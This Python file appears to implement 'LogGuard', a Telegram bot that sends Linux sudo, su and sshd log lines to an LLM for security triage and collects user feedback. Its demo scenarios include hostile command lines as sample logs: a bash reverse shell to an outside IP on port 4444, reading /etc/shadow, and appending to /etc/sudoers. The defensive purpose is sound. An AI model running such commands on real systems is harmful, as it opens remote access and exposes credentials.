"""LogGuard Telegram bot as a Vercel serverless webhook (runs 24/7, no laptop).

Vercel env vars:
  TELEGRAM_BOT_TOKEN, TG_WEBHOOK_SECRET   Telegram
  GROQ_API_KEY, GROQ_MODEL (optional)     cloud AI
  SUPABASE_URL, SUPABASE_SECRET_KEY       storage (server-side only)
"""
import hashlib
import json
import os
import time
import urllib.error
import urllib.request
from http.server import BaseHTTPRequestHandler

TOKEN = os.environ.get("TELEGRAM_BOT_TOKEN", "")
SECRET = os.environ.get("TG_WEBHOOK_SECRET", "")
GROQ_KEY = os.environ.get("GROQ_API_KEY", "")
MODELS = [m for m in [os.environ.get("GROQ_MODEL"), "llama-3.1-8b-instant", "openai/gpt-oss-20b", "qwen/qwen3-32b"] if m]
SB_URL = os.environ.get("SUPABASE_URL", "").rstrip("/")
SB_KEY = os.environ.get("SUPABASE_SECRET_KEY", "")

SYSTEM_PROMPT = """You are LogGuard, an automated Tier-1 SOC Analyst AI.
Analyze the provided Linux authentication/privilege escalation log (sudo, su, sshd).

Classification rules:
1. BENIGN (is_threat: false, severity: "LOW"): Standard admin activities via sudo (e.g., status checks, package updates, normal editing).
2. THREAT (is_threat: true, severity: "MEDIUM" or "HIGH"): Authentication failures, incorrect passwords, brute force.
3. CRITICAL THREAT (is_threat: true, severity: "CRITICAL"): High-risk actions even if authenticated (e.g., accessing /etc/shadow, modifying /etc/sudoers, disabling security tools, reverse shells).

Respond strictly in valid JSON:
{
  "is_threat": true or false,
  "severity": "LOW" | "MEDIUM" | "HIGH" | "CRITICAL",
  "confidence": integer 0-100,
  "title": "Short incident title in English",
  "explanation": "Clear explanation in English (1-2 sentences)",
  "remediation": "Concrete shell command(s) or steps in English"
}"""

SCENARIOS = {
    "bf":      ("🔐 SSH brute force", "Nov 15 03:47:12 srv01 sshd[4121]: Failed password for root from 185.220.101.47 port 51522 ssh2"),
    "status":  ("✅ Service check (sudo)", "Nov 15 10:02:44 srv01 sudo: admin : TTY=pts/0 ; PWD=/home/admin ; USER=root ; COMMAND=/usr/bin/systemctl status nginx"),
    "update":  ("📦 Package update", "Nov 15 10:15:03 srv01 sudo: admin : TTY=pts/0 ; PWD=/home/admin ; USER=root ; COMMAND=/usr/bin/apt upgrade -y"),
    "shadow":  ("🕵️ Reading /etc/shadow", "Nov 15 03:52:10 srv01 sudo: staff : TTY=pts/1 ; PWD=/home/staff ; USER=root ; COMMAND=/usr/bin/cat /etc/shadow"),
    "sudoers": ("⚠️ Editing sudoers", "Nov 15 03:55:21 srv01 sudo: www-data : TTY=pts/2 ; PWD=/var/www ; USER=root ; COMMAND=/usr/bin/tee -a /etc/sudoers"),
    "su":      ("🚪 Failed su to root", "Nov 15 14:13:50 srv01 su[2555]: FAILED SU (to root) guest on pts/3"),
    "revsh":   ("💀 Reverse shell", "Nov 15 04:01:33 srv01 sudo: www-data : TTY=pts/2 ; PWD=/tmp ; USER=root ; COMMAND=/bin/bash -c bash -i >& /dev/tcp/45.155.205.233/4444 0>&1"),
}

SURVEY = [
    ("clarity",  "1/5 · How clear were the AI explanations?", "scale"),
    ("fix",      "2/5 · How useful were the suggested fixes?", "scale"),
    ("accuracy", "3/5 · How often did you agree with the verdict?", "scale"),
    ("use",      "4/5 · Would you use LogGuard at work?", "yesno"),
    ("comment",  "5/5 · What should we improve? Send one message (or /skip).", "text"),
]


# ---------------- HTTP helpers ----------------
def http(url, data=None, headers=None, method=None, timeout=20):
    body = json.dumps(data).encode() if data is not None else None
    req = urllib.request.Request(url, data=body, method=method or ("POST" if body else "GET"),
                                 headers={"Content-Type": "application/json", "User-Agent": "LogGuard/1.0", "Accept": "application/json", **(headers or {})})
    with urllib.request.urlopen(req, timeout=timeout) as r:
        raw = r.read()
        return json.loads(raw) if raw else None


def tg(method, **data):
    try:
        return http(f"https://api.telegram.org/bot{TOKEN}/{method}", data, timeout=10)
    except Exception as e:
        print("telegram error", method, e)


def sb(path, method="GET", data=None, prefer="return=representation"):
    if not (SB_URL and SB_KEY):
        return None
    try:
        return http(f"{SB_URL}/rest/v1/{path}", data, method=method,
                    headers={"apikey": SB_KEY, "Authorization": f"Bearer {SB_KEY}", "Prefer": prefer})
    except Exception as e:
        print("supabase error", path, e)
        return None


def anon(uid):
    return hashlib.sha256(f"logguard:{uid}".encode()).hexdigest()[:12]


def esc(s):
    return str(s).replace("&", "&amp;").replace("<", "&lt;").replace(">", "&gt;")


def analyze(line):
    last = None
    for model in MODELS:
        try:
            r = http("https://api.groq.com/openai/v1/chat/completions", {
                "model": model, "temperature": 0, "response_format": {"type": "json_object"},
                "messages": [{"role": "system", "content": SYSTEM_PROMPT},
                             {"role": "user", "content": f"Analyze this log entry:\n{line}"}]},
                headers={"Authorization": f"Bearer {GROQ_KEY}"}, timeout=25)
            return json.loads(r["choices"][0]["message"]["content"]), model
        except urllib.error.HTTPError as e:
            last = f"{model}: HTTP {e.code} {e.read()[:300]!r}"; print("groq error", last)
            if e.code in (400, 403, 404):   # model unavailable on this account -> try next
                continue
            break
        except Exception as e:
            last = f"{model}: {e}"
            break
    raise RuntimeError(last)


# ---------------- session (survey state) in Supabase ----------------
def get_session(chat):
    rows = sb(f"bot_sessions?chat_id=eq.{chat}&select=step,answers")
    return rows[0] if rows else None


def set_session(chat, step, answers):
    sb("bot_sessions", "POST", {"chat_id": chat, "step": step, "answers": answers},
       prefer="resolution=merge-duplicates,return=minimal")


def del_session(chat):
    sb(f"bot_sessions?chat_id=eq.{chat}", "DELETE", prefer="return=minimal")


# ---------------- flows ----------------
def scenario_kb():
    return {"inline_keyboard": [[{"text": n, "callback_data": f"sc:{k}"}] for k, (n, _) in SCENARIOS.items()]}


def intro(chat):
    tg("sendMessage", chat_id=chat, parse_mode="HTML", reply_markup=scenario_kb(), text=(
        "👋 <b>LogGuard — AI Tier-1 security analyst for SMBs</b> (MVP)\n\n"
        "The bot reads a Linux log line (sudo / su / sshd), decides whether it is a threat or noise, "
        "shows the <b>AI confidence</b> and what to do. The final decision is always yours.\n\n"
        "<b>How to try:</b>\n1. Tap a scenario below, <i>or</i> send your own log line.\n"
        "2. Under each verdict, tell us if you agree.\n3. Rate the bot at the end: /survey\n\n"
        "🌐 Dashboard: logguard-web.vercel.app\n"
        "ℹ️ Use test data only. Answers are stored anonymously to evaluate the MVP."))


def triage(chat, uid, line, source):
    tg("sendChatAction", chat_id=chat, action="typing")
    t0 = time.time()
    try:
        a, model = analyze(line)
    except Exception as e:
        print("ai error", e)
        tg("sendMessage", chat_id=chat, text="⚠️ The AI engine is busy right now. Please try again in a minute.")
        return
    dt = time.time() - t0
    sev = str(a.get("severity", "LOW")).upper()
    icon = {"LOW": "🟢", "MEDIUM": "🟡", "HIGH": "🟠", "CRITICAL": "🔴"}.get(sev, "⚠️")
    conf = a.get("confidence", "?")
    row = sb("bot_feedback", "POST", {"user": anon(uid), "source": source, "log": line, "ai_severity": sev,
                                      "ai_is_threat": bool(a.get("is_threat")), "ai_confidence": str(conf),
                                      "latency_s": round(dt, 1)})
    fid = row[0]["id"] if row else 0
    text = (f"{icon} <b>{esc(a.get('title', 'Log analysis'))}</b>\n"
            f"<b>Verdict:</b> {'THREAT' if a.get('is_threat') else 'NOISE (safe)'} · <b>Severity:</b> <code>{sev}</code> · "
            f"<b>AI confidence:</b> <code>{conf}%</code>\n\n"
            f"🧠 <b>AI analysis:</b>\n{esc(a.get('explanation', ''))}\n\n"
            f"🛠 <b>What to do:</b>\n<code>{esc(a.get('remediation', '-'))}</code>\n\n"
            f"📄 <b>Log:</b>\n<code>{esc(line)}</code>\n\n⏱ {dt:.1f} s · The decision is yours 👇")
    kb = {"inline_keyboard": [[{"text": "✅ Real threat", "callback_data": f"fb:{fid}:threat"},
                               {"text": "❌ False alarm", "callback_data": f"fb:{fid}:noise"}],
                              [{"text": "🤷 Not sure", "callback_data": f"fb:{fid}:unsure"}]]}
    tg("sendMessage", chat_id=chat, text=text, parse_mode="HTML", reply_markup=kb)


def ask(chat, step):
    key, q, kind = SURVEY[step]
    if kind == "scale":
        tg("sendMessage", chat_id=chat, text=q + "\n(1 = poor, 5 = excellent)",
           reply_markup={"inline_keyboard": [[{"text": str(i), "callback_data": f"sv:{key}:{i}"} for i in range(1, 6)]]})
    elif kind == "yesno":
        tg("sendMessage", chat_id=chat, text=q, reply_markup={"inline_keyboard": [[
            {"text": t, "callback_data": f"sv:{key}:{v}"} for t, v in (("Yes", "yes"), ("Maybe", "maybe"), ("No", "no"))]]})
    else:
        tg("sendMessage", chat_id=chat, text=q)


def answer(chat, uid, key, value):
    s = get_session(chat)
    if not s or s["step"] >= len(SURVEY) or SURVEY[s["step"]][0] != key:
        return
    answers = {**(s["answers"] or {}), key: value}
    step = s["step"] + 1
    if step < len(SURVEY):
        set_session(chat, step, answers); ask(chat, step)
    else:
        rec = {"user": anon(uid), **answers}
        for k in ("clarity", "fix", "accuracy"):
            rec[k] = int(rec[k])
        sb("bot_surveys", "POST", rec, prefer="return=minimal")
        del_session(chat)
        tg("sendMessage", chat_id=chat, text="🙏 Thank you! Your feedback helps us improve LogGuard.\nTry more scenarios: /scenarios")


def on_message(m):
    chat, uid = m["chat"]["id"], m["from"]["id"]
    text = (m.get("text") or "").strip()
    if not text:
        return
    s = get_session(chat)
    if s and s["step"] < len(SURVEY) and SURVEY[s["step"]][2] == "text":
        answer(chat, uid, "comment", "" if text == "/skip" else text[:1000]); return
    cmd = text.split()[0].split("@")[0].lower()
    if cmd == "/start":
        intro(chat)
    elif cmd == "/scenarios":
        tg("sendMessage", chat_id=chat, text="Pick a scenario:", reply_markup=scenario_kb())
    elif cmd == "/survey":
        set_session(chat, 0, {})
        tg("sendMessage", chat_id=chat, text="📝 Quick survey — 5 questions, 1 minute."); ask(chat, 0)
    elif cmd == "/help":
        tg("sendMessage", chat_id=chat, text="/scenarios — demo scenarios\n/survey — rate the bot\nOr send any Linux log line.")
    elif cmd.startswith("/"):
        tg("sendMessage", chat_id=chat, text="Unknown command. Try /scenarios or /survey.")
    else:
        triage(chat, uid, text[:2000], "custom")


def on_callback(c):
    chat, uid, data = c["message"]["chat"]["id"], c["from"]["id"], c["data"]
    mid = c["message"]["message_id"]
    tg("answerCallbackQuery", callback_query_id=c["id"])
    if data.startswith("sc:") and data[3:] in SCENARIOS:
        triage(chat, uid, SCENARIOS[data[3:]][1], f"scenario:{data[3:]}")
    elif data.startswith("fb:"):
        _, fid, vote = data.split(":")
        tg("editMessageReplyMarkup", chat_id=chat, message_id=mid, reply_markup={"inline_keyboard": []})
        rows = sb(f"bot_feedback?id=eq.{int(fid)}&select=ai_is_threat")
        agree = None if vote == "unsure" or not rows else ((vote == "threat") == rows[0]["ai_is_threat"])
        sb(f"bot_feedback?id=eq.{int(fid)}", "PATCH", {"user_verdict": vote, "agree": agree}, prefer="return=minimal")
        label = {"threat": "real threat", "noise": "false alarm", "unsure": "not sure"}[vote]
        tg("sendMessage", chat_id=chat, text=f"✅ You marked: {label}\nTry another scenario: /scenarios · Rate the bot: /survey")
    elif data.startswith("sv:"):
        _, key, value = data.split(":")
        tg("editMessageReplyMarkup", chat_id=chat, message_id=mid, reply_markup={"inline_keyboard": []})
        answer(chat, uid, key, value)


class handler(BaseHTTPRequestHandler):
    def _ok(self, msg=b"ok"):
        self.send_response(200); self.send_header("Content-Type", "text/plain"); self.end_headers(); self.wfile.write(msg)

    def do_GET(self):
        self._ok(b"LogGuard bot webhook is up")

    def do_POST(self):
        if SECRET and self.headers.get("X-Telegram-Bot-Api-Secret-Token") != SECRET:
            self.send_response(403); self.end_headers(); return
        try:
            u = json.loads(self.rfile.read(int(self.headers.get("Content-Length", 0))) or b"{}")
            if "message" in u:
                on_message(u["message"])
            elif "callback_query" in u:
                on_callback(u["callback_query"])
        except Exception as e:
            print("handler error", e)
        self._ok()
